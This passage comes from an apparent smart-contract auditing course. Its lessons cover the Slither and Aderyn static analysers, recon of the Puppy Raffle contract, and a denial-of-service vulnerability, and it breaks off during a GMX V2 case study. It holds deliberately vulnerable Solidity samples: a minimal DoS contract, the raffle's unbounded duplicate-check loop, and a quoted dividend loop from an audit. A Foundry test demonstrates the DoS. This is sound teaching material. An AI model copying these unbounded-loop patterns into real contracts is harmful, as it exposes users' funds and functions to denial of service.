        video_url: WH00nL8yLV00AYJRsTcNGbYUJeWDB8qeABsODj7ZilE3o
        raw_markdown_url: /routes/security/4-puppy-raffle/4-tooling-slither/+page.md
        markdown_content: |-
          ---
          title: Tooling - Slither
          ---

          _Follow along with this video:_

          ---

          ### Leveraging our Tools

          Auditing smart contracts is an arduous yet essential task in the blockchain realm. To facilitate this process, there are excellent tools to help auditors catch bugs efficiently. In this post, we'll explore two popular static analysis tools that can significantly speed up the auditing process: Slither and Aderyn. Having knowledge of these tools isn't just beneficial for auditors ‚Äî anyone aiming to be a top developer should consider these tools as an essential part of their toolbox.

          ### Static Analysis - Boosting Your Auditing Efficiency

          <img src="/security-section-4/4-tooling-slither/tooling-slither1.png" style="width: 75%; height: auto;">

          Static analysis is a method where code is checked for potential issues without actually executing it. Essentially, it's a way to "debug" your code by looking for specific keywords in a certain order or pattern.

          The most widely used tools for this purpose include [**Slither**](https://github.com/crytic/slither), developed by the [**Trail of Bits**](https://www.trailofbits.com/) team, and a Rust-based tool that we've developed known as [**Aderyn**](https://github.com/Cyfrin/aderyn).

          > **Note**: It's important to remember that these tools should be run before going for an audit.

          ### Slither - A Python-Powered Static Analysis Tool

          Slither tops the charts as the most popular and potentially the most potent static analysis tool available. Built using Python, it offers compatibility with both Solidity and Vyper developments. An open-source project, Slither allows developers to add plugins via PR.

          The Slither repo provides instructions on installation and usage.

          I want to bring your attention to the [**Detectors**](https://github.com/crytic/slither/wiki/Detector-Documentation) section of the documentation.

          This document lists _all_ the vulnerabilities that Slither is checking for and recommendations for them.

          For example:

          <img src="/security-section-4/4-tooling-slither/tooling-slither2.png" style="width: 75%; height: auto;">

          This could have helped us with PasswordStore! It's easy to see how valuable these tools can be in making our work easier and more efficient.

          ### Installing Slither

          We won't go over the specifics of installation in this course. As intermediate developers, we should have some familiarity with this process.

          Choose the installation method that works best for you (Options outlined here), and if you run into issues don't hesitate to ask an AI like [**Phind**](https://www.phind.com/search?home=true) or [**ChatGPT**](https://chat.openai.com). They're great at debugging installation problems.

          > **Note:** In addition to Slither, you may need to install [**Python**](https://www.python.org/downloads/), if you haven't.

          Once installed ensure everything is up-to-date with:

          ```bash
          pip3 install --upgrade slither-analyzer
          ```

          ### Running Slither

          The Slither documentation outlines usage for us. Slither will automatically detect if the project is a Hardhat, Foundry, Dapp or Brownie framework and compile things accordingly.

          In order to run slither on our current repo we just use the command:

          ```bash
          slither .
          ```

          This execution may take some time, depending on the size of the codebase. If we run it on Puppy Raffle, we're going to get a _massive_ output of potential issues.

          The output color codes potential issues:

          - **Green** - Areas that are probably ok, may be `informational` findings, we may want to have a look
          - **Yellow** - Potential issue detected, we should probably take a closer look
          - **Red** - Signifant issues detected that should absolutely be addressed.

          Here's an example of what some of these look like:

          <img src="/security-section-4/4-tooling-slither/tooling-slither3.png" style="width: 75%; height: auto;">

          ### Wrap Up

          By leveraging Slither, audits become more efficient, making it a fantastic tool for developers who are looking to minimize the time they spend on debugging and maximize their protocol's security.

          > Always remember, static analysis tools enhance our security review, they don't replace our manual efforts!
        description: 'Tooling in Smart Contract Auditing, Patrick Introduces Static Analysis. Using Slither by Trail of Bits to find bugs without executing code.'
      -
        id: 76b4b6ad-f6df-4073-8f6f-f87b91f2e2db
        type: new_lesson
        enabled: true
        title: 'Tooling: Aderyn'
        slug: tooling-aderyn
        duration: 2
        video_url: cYAn1V8VKFyg4pDqHeigrlN2ttJhwI1ZQHZRKOFYLc8
        raw_markdown_url: /routes/security/4-puppy-raffle/5-tooling-aderyn/+page.md
        markdown_content: |-
          ---
          title: Tooling - Aderyn
          ---

          _Follow along with this video:_

          ---

          ### Introducing Aderyn: A Rust Based Static Analysis Tool

          The second powerful tool we'll be using in this course is a Rust-based analyzer, [**Aderyn**](https://github.com/Cyfrin/aderyn). This tool was created by the smart contract developer legend [**Alex Roan**](https://github.com/alexroan).

          ### Installation of Aderyn

          Before we can use `Aderyn`, we'll need to first install `Rust`. Like `Slither`, we won't go over the specifics of installation, but you can find a guide with installation options available to you [**here**](https://www.rust-lang.org/tools/install).

          > Remember: If you have issues with installation, AI is great at helping with this, you can also leverage the communities on Stack Overflow!

          Once `Rust` has been installed, you can run the command `cargo install Aderyn`. This will install our tool.

          <img src="/security-section-4/5-tooling-aderyn/tooling-aderyn1.png" style="width: 75%; height: auto;">

          > **Note:** If you've already installed Aderyn, this command will also update you to the current version. Your terminal will advise if the tool is already installed.

          ### Running Aderyn

          To run Aderyn, the command is `Aderyn [OPTIONS] <root>`. Since we're already in the root directory of our project, we can just run:

          ```bash
          aderyn .
          ```

          Running this command will compile our contracts, our terminal will display the usual compilation warnings - at the bottom of the output however, we can see _`Detectors run, printing report. Report printed to ./report.md`_

          We should see this fine in our IDE explorer. If we open it up...

          <details closed>
          <summary>Puppy Raffle Aderyn Report</summary>

          # Aderyn Analysis Report

          This report was generated by [Aderyn](https://github.com/Cyfrin/aderyn), a static analysis tool built by [Cyfrin](https://cyfrin.io), a blockchain security company. This report is not a substitute for manual audit or security review. It should not be relied upon for any purpose other than to assist in the identification of potential security vulnerabilities.

          # Table of Contents

          - [Aderyn Analysis Report](#aderyn-analysis-report)
          - [Table of Contents](#table-of-contents)
          - [Summary](#summary)
            - [Files Summary](#files-summary)
            - [Files Details](#files-details)
            - [Issue Summary](#issue-summary)
          - [Medium Issues](#medium-issues)
            - [M-1: Centralization Risk for trusted owners](#m-1-centralization-risk-for-trusted-owners)
          - [Low Issues](#low-issues)
            - [L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-1-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)
            - [L-2: Solidity pragma should be specific, not wide](#l-2-solidity-pragma-should-be-specific-not-wide)
            - [L-3: Conditional storage checks are not consistent](#l-3-conditional-storage-checks-are-not-consistent)
          - [NC Issues](#nc-issues)
            - [NC-1: Missing checks for `address(0)` when assigning values to address state variables](#nc-1-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
            - [NC-2: Functions not used internally could be marked external](#nc-2-functions-not-used-internally-could-be-marked-external)
            - [NC-3: Constants should be defined and used instead of literals](#nc-3-constants-should-be-defined-and-used-instead-of-literals)
            - [NC-4: Event is missing `indexed` fields](#nc-4-event-is-missing-indexed-fields)
              - [Wrap Up](#wrap-up)

          # Summary

          ## Files Summary

          | Key         | Value |
          | ----------- | ----- |
          | .sol Files  | 1     |
          | Total nSLOC | 143   |

          ## Files Details

          | Filepath            | nSLOC   |
          | ------------------- | ------- |
          | src/PuppyRaffle.sol | 143     |
          | **Total**           | **143** |

          ## Issue Summary

          | Category | No. of Issues |
          | -------- | ------------- |
          | Critical | 0             |
          | High     | 0             |
          | Medium   | 1             |
          | Low      | 3             |
          | NC       | 4             |

          # Medium Issues

          ## M-1: Centralization Risk for trusted owners

          Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

          - Found in src/PuppyRaffle.sol [Line: 18](src/PuppyRaffle.sol#L18)

            ```solidity
            contract PuppyRaffle is ERC721, Ownable {
            ```

          - Found in src/PuppyRaffle.sol [Line: 167](src/PuppyRaffle.sol#L167)

            ```solidity
                function changeFeeAddress(address newFeeAddress) external onlyOwner {
            ```

          # Low Issues

          ## L-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`

          Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). Unless there is a compelling reason, `abi.encode` should be preferred. If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).
          If all arguments are strings and or bytes, `bytes.concat()` should be used instead.

          - Found in src/PuppyRaffle.sol [Line: 197](src/PuppyRaffle.sol#L197)

            ```solidity
                        abi.encodePacked(
            ```

          - Found in src/PuppyRaffle.sol [Line: 201](src/PuppyRaffle.sol#L201)

            ```solidity
                                    abi.encodePacked(
            ```

          ## L-2: Solidity pragma should be specific, not wide

          Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

          - Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

            ```solidity
            pragma solidity ^0.7.6;
            ```

          ## L-3: Conditional storage checks are not consistent

          When writing `require` or `if` conditionals that check storage values, it is important to be consistent to prevent off-by-one errors. There are instances found where the same storage variable is checked multiple times, but the conditionals are not consistent.

          - Found in src/PuppyRaffle.sol [Line: 140](src/PuppyRaffle.sol#L140)

            ```solidity
                    if (rarity <= COMMON_RARITY) {
            ```

          - Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)

            ```solidity
                    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            ```

          # NC Issues

          ## NC-1: Missing checks for `address(0)` when assigning values to address state variables

          Assigning values to address state variables without checking for `address(0)`.

          - Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

            ```solidity
                    feeAddress = _feeAddress;
            ```

          - Found in src/PuppyRaffle.sol [Line: 150](src/PuppyRaffle.sol#L150)

            ```solidity
                    previousWinner = winner;
            ```

          - Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)

            ```solidity
                    feeAddress = newFeeAddress;
            ```

          ## NC-2: Functions not used internally could be marked external

          - Found in src/PuppyRaffle.sol [Line: 79](src/PuppyRaffle.sol#L79)

            ```solidity
                function enterRaffle(address[] memory newPlayers) public payable {
            ```

          - Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)

            ```solidity
                function refund(uint256 playerIndex) public {
            ```

          - Found in src/PuppyRaffle.sol [Line: 189](src/PuppyRaffle.sol#L189)

            ```solidity
                function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
            ```

          ## NC-3: Constants should be defined and used instead of literals

          - Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)

            ```solidity
                    for (uint256 i = 0; i < players.length - 1; i++) {
            ```

          - Found in src/PuppyRaffle.sol [Line: 87](src/PuppyRaffle.sol#L87)

            ```solidity
                        for (uint256 j = i + 1; j < players.length; j++) {
            ```

          - Found in src/PuppyRaffle.sol [Line: 127](src/PuppyRaffle.sol#L127)

            ```solidity
                    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
            ```

          - Found in src/PuppyRaffle.sol [Line: 132](src/PuppyRaffle.sol#L132)

            ```solidity
                    uint256 prizePool = (totalAmountCollected * 80) / 100;
            ```

          - Found in src/PuppyRaffle.sol [Line: 133](src/PuppyRaffle.sol#L133)

            ```solidity
                    uint256 fee = (totalAmountCollected * 20) / 100;
            ```

          - Found in src/PuppyRaffle.sol [Line: 139](src/PuppyRaffle.sol#L139)

            ```solidity
                    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
            ```

          ## NC-4: Event is missing `indexed` fields

          Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

          - Found in src/PuppyRaffle.sol [Line: 53](src/PuppyRaffle.sol#L53)

            ```solidity
                event RaffleEnter(address[] newPlayers);
            ```

          - Found in src/PuppyRaffle.sol [Line: 54](src/PuppyRaffle.sol#L54)

            ```solidity
                event RaffleRefunded(address player);
            ```

          - Found in src/PuppyRaffle.sol [Line: 55](src/PuppyRaffle.sol#L55)

            ```solidity
                event FeeAddressChanged(address newFeeAddress);
            ```

          </details>

          ---

          _**WOW!**_ We have a report of vulnerabilities already gorgeously formatted and ready to be added to our audit report.

          ### Wrap Up

          Fast, and efficient, [**Aderyn**](https://github.com/Cyfrin/aderyn) offers a swift vulnerability report of your smart contracts which is almost ready to be presented. Aesthetically neat and structurally organized, the tool is a quick starter for anyone performing security reviews. We'll be leveraging the poweer of Aderyn throughout the course!.

          Let's look at one more tool briefly in the next lesson.
        description: 'Introducing Aderyn: a static analysis tool for smart contracts, built with Rust by Alex Roan.'
      -
        id: 3dec10d0-e6c7-4d0d-a220-fcdcad3d42c6
        type: new_lesson
        enabled: true
        title: 'Tooling: Solidity Visual Developer'
        slug: tooling-solidity-visual-developer
        duration: 3
        video_url: Dek01sy02wtQk00J2Kfrf4302V68TYm00VPBXMHYLxPIcYtM
        raw_markdown_url: /routes/security/4-puppy-raffle/6-tooling-solidity-visual-developer/+page.md
        markdown_content: |-
          ---
          title: Tooling - Solidity Visual Developer
          ---

          _Follow along with this video:_

          ---

          ### Tools in our Belt

          We've already got a handful of tools at our disposal.

          - `Slither`
          - `Aderyn`
          - `CLOC`

          We also went over `Solidity Metrics` earlier, but let's take another look as `Puppy Raffle` is going to afford us some more interesting insight into the power of this tool.

          > Remember: you can right-click your `src` folder in the `Puppy Raffle` workspace and select `Solidity: Metrics` from the context menu to run the tool on that directory.

          ### Solidity Metrics Insights

          Scrolling to the bottom of the `Solidity: Metrics` report, take a look at the `Inheritence Graph`

          <img src="/security-section-4/6-tooling-svd/tooling-svd1.png" style="width: 75%; height: auto;">

          From this illustration we can see that the contract `PuppyRaffle` is of types `ERC721` and `Ownable`.

          A little further down we see a `Call Graph`

          <img src="/security-section-4/6-tooling-svd/tooling-svd2.png" style="width: 75%; height: auto;">

          This provides us a clear reference of which functions are being called by which other functions!

          And finally `Solidity: Metrics` gives us a `Contract Summary`

          <img src="/security-section-4/6-tooling-svd/tooling-svd3.png" style="width: 75%; height: auto;">

          This is incredibly valuable. It provides is a clear breakdown of `Internal` vs `External functions` as well as identifies which functions are `payable` and can `modify state`!

          ### Solidity Visual Developer

          There's another tool I'll briefly mention - some developers swear by it. It's the extension [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor) for VS Code.

          In addition to providing very similar reporting as Solidity Metrics, the inheritence graph is interactive and it provides syntax highlighting in your code based on variable types.

          <img src="/security-section-4/6-tooling-svd/tooling-svd4.png" style="width: 75%; height: auto;">

          Check it out if you feel it would be useful for adding some clarity to your development and security reviews!

          Next we're going to dive deeper into the exciting world of static analysis tools. We'll take a closer look at the Solidity Metrics tool, which we introduced before, and also explore another tool known as Solidity Visual Developer.

          ### Wrap Up

          Now that we've a firm grasp of our tooling options available, let's get started on this `Puppy Raffle` review. We're onto `Recon` - let's start with the documentation.
        description: 'Patrick goes over additional useful tools like Solidity Metics and Solidity Visual Developer.'
      -
        id: 9e5aea50-0a65-4d44-940c-5ca0f7662c9f
        type: new_lesson
        enabled: true
        title: 'Recon: Reading docs'
        slug: recon-reading-docs
        duration: 2
        video_url: ZVGX01fRYnBjs4V00gHyS9apA1nHgA102Ed501KvqezHyzc
        raw_markdown_url: /routes/security/4-puppy-raffle/7-recon-reading-docs/+page.md
        markdown_content: |-
          ---
          title: Recon - Reading Docs
          ---

          _Follow along with this video:_

          ---

          ### Context from Documentation

          Ok, we've scoped things out. Let's start with step 1 of `The Tincho` - Reading the documentation.

          What we've been provided is a little sparse - but read through the README of [**Puppy Raffle**](https://github.com/Cyfrin/4-puppy-raffle-audit).

          <details>
          <summary>About Puppy Raffle</summary>

          <p align="center">
          <img src="/security-section-4/7-recon-reading-docs/reading-docs1.svg" style="width: 75%; height: auto;">
          <br/>

          # Puppy Raffle

          This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

          1. Call the `enterRaffle` function with the following parameters:
             1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
          2. Duplicate addresses are not allowed
          3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
          4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
          5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

          </details>

          ---

          Above we see a pretty clear description of the protocol and it's intended functionality. What I like to do is open a `notes.md` file in my project and summarize things in my own words.

          ```
          ## About

          > The project allows users to enter a raffle to win a dog NFT.
          ```

          Use this notes file to record your thoughts as you go, it'll make summarizing things for our report much easier later.

          Let's take a look at some of the code that powers the expected functionality in the next lesson.
        description: 'Puppy Raffle Audit Walkthrough - Main Branch Details. Patrick explains raffle documentation, functions, and entry requirements.'
      -
        id: 5efe7fcf-556b-464d-96be-e49c83a841a8
        type: new_lesson
        enabled: true
        title: 'Recon: Reading the code'
        slug: recon-reading-the-code
        duration: 5
        video_url: LPwoILK9EA00IuxBDv1vNL02doAOebBkfzjEPSQ84eZTc
        raw_markdown_url: /routes/security/4-puppy-raffle/8-recon-reading-the-code/+page.md
        markdown_content: |-
          ---
          title: Recon - Reading the Code
          ---

          _Follow along with this video:_

          ---

          ### Starting with the Code

          What I like to do when first assessing a codebase is to start at the `main entry point`. Sometimes this area of a protocol may be a little unclear, but using Solidity: Metrics can help us out a lot.

          <img src="../../../../static/security-section-4/7-recon-reading-docs/reading-docs2.png" style="width: 75%; height: auto;">

          Pay special attention to the functions marked `public` or `external`. Especially those which `modify state` or are `payable`. These are going to be certain potential attack vectors.

          > **Note:** In Foundry you can use the command `forge inspect PuppyRaffle methods` to receive an output of methods for the contract.

          I would start with the `enterRaffle` function. Let's take a look.

          ```js
          /// @notice this is how players enter the raffle
          /// @notice they have to pay the entrance fee * the number of players
          /// @notice duplicate entrants are not allowed
          /// @param newPlayers the list of players to enter the raffle
          function enterRaffle(address[] memory newPlayers) public payable {
              require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
              for (uint256 i = 0; i < newPlayers.length; i++) {
                  players.push(newPlayers[i]);
              }

              // Check for duplicates
              for (uint256 i = 0; i < players.length - 1; i++) {
                  for (uint256 j = i + 1; j < players.length; j++) {
                      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                  }
              }
              emit RaffleEnter(newPlayers);
          }
          ```

          Starting with the `NatSpec` we may have a few questions rise.

          - _What's meant by # of players?_
          - _How does the function prevent duplicant entrants?_

          Write questions like these in your `notes.md` or even as `@audit` notes inline. These are things we'll want to answer as we progress through the code.

          ###

          One thing I notice in our next few lines is - I don't really love their naming conventions. `entranceFee` is immutable and nothing in this function makes that clear to me (unless I'm using [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor)).

          Were this a private audit, I may start an `Informational` section in my `notes.md`.

          ```
          ## About

          > The project allows users to enter a raffle to win a dog NFT.

          ## Informational

          `PuppyRaffle::entranceFee` is immutable and should follow a more clear naming convention

              ie. `i_entranceFee` or `ENTRANCE_FEE`
          ```

          > **Pro-tip:** In VS Code you can use these keyboard shortcuts to navigate between previous and next cursor positions:
          >
          > - Windows: `Alt + Left/Right Arrow`
          > - Mac:
          >   - Previous - `Control + '-'`
          >   - Next - `Control + Shift + '-'`

          ### Wrap Up

          We're going to be bouncing between `Recon` and `Vulnerability` phases a bit in the Puppy Raffle review. Sometimes the lines can be a little blurry, but you'll find a workflow that works well for you with time and experience.

          Let's go back to the code.
        description: 'Navigate PuppyRaffle codebase, player entry points, keyboard shortcuts.'
      -
        id: 4cbdd7b4-0509-4c40-9950-63db5206f49b
        type: new_lesson
        enabled: true
        title: 'Recon: Reading docs II'
        slug: recon-reading-docs-continued
        duration: 3
        video_url: 01Y7ckXfjR2ikuPmu1LTs401rW5cLQ6t7VegBDMW7KfoM
        raw_markdown_url: /routes/security/4-puppy-raffle/9-recon-reading-docs-continued/+page.md
        markdown_content: |-
          ---
          title: Recon - Reading Docs Continued
          ---

          _Follow along with this video:_

          ---

          ### Back to `enterRaffle`

          ```js
          function enterRaffle(address[] memory newPlayers) public payable {
              require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
              for (uint256 i = 0; i < newPlayers.length; i++) {
                  players.push(newPlayers[i]);
              }

              // Check for duplicates
              for (uint256 i = 0; i < players.length - 1; i++) {
                  for (uint256 j = i + 1; j < players.length; j++) {
                      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                  }
              }
              emit RaffleEnter(newPlayers);
          }
          ```

          Back to our `main entry point` function, we see it's using a require statement. Now, this contract is using `pragma 0.7.6`, so custom reverts may not have existed then - but this is a great example of a note we'd want to take and something we should check later.

          ```js
          function enterRaffle(address[] memory newPlayers) public payable {
              require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); //@audit - Are custom reverts an option in 0.7.6?
              ...
          }
          ```

          A few additional details we notice as we traverse the function:

          - Our require statement compares to `newPlayers.length` - _what happens if this is 0?_
          - The `entranceFee` is an `immutable variable` - we can confirm this is initialized in the constructor.
          - The raffle is keeping track of who has entered the raffle by pushing each index of `newPlayers[]` to `players[]`.

          The last section of this function is finally our check for duplicates.

          ```js
          // Check for duplicates
          for (uint256 i = 0; i < players.length - 1; i++) {
              for (uint256 j = i + 1; j < players.length; j++) {
                  require(players[i] != players[j], "PuppyRaffle: Duplicate player");
              }
          }
          ```

          With experience you'll be able to _smell_ bugs. You'll see messy blocks of code like the above and your intuition is going to kick in.

          Can you spot the bugüêõ?

          ### Wrap Up

          We've learnt SO MUCH from this single entry point of this contract. I hope you've been taking notes of what we uncover as we go. These protocol's we're going through may be small in scope - but they won't always be. Building strong organizational habits now will benefit you later on.

          Next, let's take a look at a repo in which we've compiled simplified examples of common exploits, maybe we'll find the bug mentioned above!
        description: 'In this lesson Patrick continues reading through the docs and even smell a bug!'
      -
        id: c05360dd-ce70-4852-ac01-d7f15c9d2f44
        type: new_lesson
        enabled: true
        title: sc-exploits-minimized
        slug: sc-exploits-minimized
        duration: 2
        video_url: OSMLqn1AAWsIApMjLLTWOingE2AIOAWjZQfcuest6w8
        raw_markdown_url: /routes/security/4-puppy-raffle/10-sc-exploits-minimized/+page.md
        markdown_content: |-
          ---
          title: sc-exploits-minimized
          ---

          _Follow along with this video:_

          ---

          ### Exploits, but smaller

          ```js
          // Check for duplicates
          for (uint256 i = 0; i < players.length - 1; i++) {
              for (uint256 j = i + 1; j < players.length; j++) {
                  require(players[i] != players[j], "PuppyRaffle: Duplicate player");
              }
          }
          ```

          This code above is going to cause something called a Denial of Service or DOS.

          In order to get a better understanding of this bug, let's look at a _minimized_ example of it. If you reference the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo, half way down you should see something like what's pictured below.

          <img src="/security-section-4/10-sc-exploits-minimized/sc-exploits-minimized1.png" style="width: 75%; height: auto;">

          This is an amazing resource to test your skills in general and familiarize yourself with common exploits. Addionally the `src` folder of `sc-exploits-minimized` contains minimalistic examples of a variety of vulnerabilities as well.

          For now, let's check out the [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of the Denial of Service exploit in the next lesson.
        description: 'Introducing the sc-exploits-minimized repo, a compilation of common smart contract vulnerability examples.'
      -
        id: 22735d90-b37e-49c8-9c29-5267ddbf07fa
        type: new_lesson
        enabled: true
        title: 'Exploit: Denial of service'
        slug: exploit-denial-of-service
        duration: 7
        video_url: mM00102cLTV005LZgeRkPvCb00ztJPl2FnMv00nAG7XcoshM
        raw_markdown_url: /routes/security/4-puppy-raffle/11-exploit-denial-of-service/+page.md
        markdown_content: |-
          ---
          title: Exploit - Denial of Service (DoS)
          ---

          _Follow along with this video:_

          ---

          ### Denial of Service

          Let's dive right in and take a look at the DoS contract brought up in our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) example.

          <details open>
          <summary>DoS Contract</summary>

          ```js
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.20;

          contract DoS {
              address[] entrants;

              function enter() public {
                  // Check for duplicate entrants
                  for (uint256 i; i < entrants.length; i++) {
                      if (entrants[i] == msg.sender) {
                          revert("You've already entered!");
                      }
                  }
                  entrants.push(msg.sender);
              }
          }
          ```

          </details>

          We can see right away that this `enter` function is doing something very similar to what we saw in `PuppyRaffle::enterRaffle`. Every time someone calls this function, it checks for a duplicate in the `entrants` array, and if one isn't found `msg.sender` is added to `entrants`.

          The problem arises when the size of our `entrants` array grows. Every time someone is added to the `entrants` array, another loop is added to the duplicate check and as a result `more gas is consumed`.

          ### Remix Example

          We can see this in action by deploying our contract on Remix and comparing the gas consumed when we call this function subsequent times (remember, you'll need to switch your address being used).

          Here's what it looks like for the first four people calling the `enter` function.

          <img src="/security-section-4/11-exploit-denial-of-service/exploit-denial-of-service1.png" style="width: 75%; height: auto;">

          This kind of behavior raises questions about fairness and ultimately is going to lead to a `denial of service` in that it will become impractical for anyone to interact with this function, because gas costs will be too high.

          ### Exploring DoS attack in Foundry

          Conveniently, if you clone the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo. I've included a test suite to illustrate these attack vectors as well.

          ```bash
          git clone https://github.com/Cyfrin/sc-exploits-minimized
          cd sc-exploits-minimized
          make
          ```

          The above series of commands will clone the repo and build it locally.

          Once this is done, I want to draw you attention to `/test/unit/DoSTest.t.sol`

          To summarize, this test deploys the same `DoS` contract we've been looking at:

          ```js
          function setUp() public {
                  dos = new DoS();
              }
          ```

          Calls the `enter` function and records the gas costs of those calls:

          ```js
          vm.prank(warmUpAddress);
              dos.enter();

              uint256 gasStartA = gasleft();
              vm.prank(personA);
              dos.enter();
              uint256 gasCostA = gasStartA - gasleft();

              uint256 gasStartB = gasleft();
              vm.prank(personB);
              dos.enter();
              uint256 gasCostB = gasStartB - gasleft();

              uint256 gasStartC = gasleft();
              vm.prank(personC);
              dos.enter();
              uint256 gasCostC = gasStartC - gasleft();
          ```

          And finally prints the gas costs and asserts that each call is more expensive than the last:

          ```js
          console2.log("Gas cost A: %s", gasCostA);
          console2.log("Gas cost B: %s", gasCostB);
          console2.log("Gas cost C: %s", gasCostC);

          assert(gasCostC > gasCostB);
          assert(gasCostB > gasCostA);
          ```

          If we run this test with `forge test --mt test_denialOfService -vvv` we see that the test indeed passes and we get a print out corroborating the vulnerability!

          <img src="/security-section-4/11-exploit-denial-of-service/exploit-denial-of-service2.png" style="width: 75%; height: auto;">

          I challenge you to play with this test a little bit and customize it. See if you can adjust it to print out the gas costs with 1000 entrants!

          ### Wrap Up

          As can be seen, DoS attacks can be very impactful for a protocol. They can inject unfairness and cause interactions to be prohibitively expensive.

          In our next lesson we'll be looking at a case study of one such attack.
        description: 'Explore a DoS attack using a minimalistic DOS contract. Learn how loops and arrays can make a protocol unusable.'
      -
        id: f92b18c6-4e62-46f7-82d8-5b3c43e6e24d
        type: new_lesson
        enabled: true
        title: 'Case Study: DoS'
        slug: dos-case-study
        duration: 21
        video_url: lsOACFdb015xAPbt5ecssfxFS2aMG0102ljJW3q8sjAUJE
        raw_markdown_url: /routes/security/4-puppy-raffle/12-dos-case-study/+page.md
        markdown_content: |-
          ---
          title: DoS - Case Study
          ---

          _Follow along with this video:_

          ---

          ### Live DoS Examples

          In this lesson, we delve into two different kinds of **Denial of Service Attacks** or **DoS attacks** as they were uncovered from real security reviews. Owen, the founder of Guardian Audits, will share insights from his work, showing us how these vulnerabilities arise and the best frameworks to uncover them.

          ### Introduction to Owen

          The case studies we'll be covering today are brought to us by Owen - the Founder of Guardian Audits. Guardian Audits was founded 2 years ago and has since made Web3 more secure by uncovering hundreds of vulnerabilities.

          In this lesson, Owen provides a breakdown of audits in which DoS vulnerabilities were uncovered and we're greatly appreciative to Owen for his contributions. üôè

          ## Case Study 1: Bridges Exchange

          The first DoS vulnerability we'll touch on was found in the dividends distribution system of the Bridges exchange.

          ### Attack Mechanics

          The issue arises from an `unbounded for-loop` in the `distributeDividends` function, resulting in the risk of a DoS attack. An ill-intentioned party can cause the distribute dividends function to violate the block gas limit, effectively blocking all dividends by continually generating new addresses and minting minimal quantities of the Bridges pair token.

          Let's look at the code.

          ```js
          function distributeDividends(uint amount) public payable lock {
             require(amount == msg.value, "don't cheat");
             uint length = users.length;
             amount = amount.mul(magnitude);
             for (uint i; i < length; i++){
                if(users[i] != address(0)){
                   UserInfo storage user = userInfo[users[i]];
                   user.rewards += (amount.mul(IERC20(address(thiss).balanceOf(users[i])).div(totalSupply.sub(MINIMUM_LIQUIDITY))));
                }
             }
          }
          ```

          We can see the `unbounded for-loop` above. This is looping through an array, `users[]`, the length of which has no limits.

          The practical effect of this is that, were the length of the `users[]` array long enough, the gas required to call this function would be prohibitively expensive. Potentially hitting block caps and being entirely uncallable.

          ### Confirming the Attack Vector

          In order to verify this is a vulnerability. We should invesitgate under what circumstances the `user[]` array can be added to.

          By searching for the variable we see the array is appended to in the mint function:

          ```js
          function mint(address to) external lock returns (uint liquidity){
             ...
             if(IERC20(address(this).balanceOf(to) == 0)){
                users.push(to);
             }
          }
          ```

          In theory, an attacker could generate new wallet addresses (or transfer the minted tokens) to call this function repeatedly, bloating the array and DOSing the function.

          The resolution for the Bridges Exchange was to refactor things such that the `for-loop` wasn't needed.

          ## Case Study 2: Dos Attack in GMX V2

          The second instance of a DoS attack shows up in the GMX V2 system and is entirely different than the Bridges Exchange case mentioned above.

          ### Attack Mechanics

